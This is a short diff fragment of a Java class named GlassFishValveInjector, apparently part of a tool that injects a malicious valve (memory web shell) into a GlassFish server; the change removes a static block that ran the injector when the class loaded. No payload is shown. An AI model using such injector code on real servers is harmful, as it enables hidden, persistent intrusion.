@@ -13,10 +13,6 @@ import java.util.zip.GZIPInputStream;
  */
 public class GlassFishValveInjector {
 
-    static {
-        new GlassFishValveInjector();
-    }
-
     public GlassFishValveInjector() {
         try {
             List<Object> contexts = getContext();
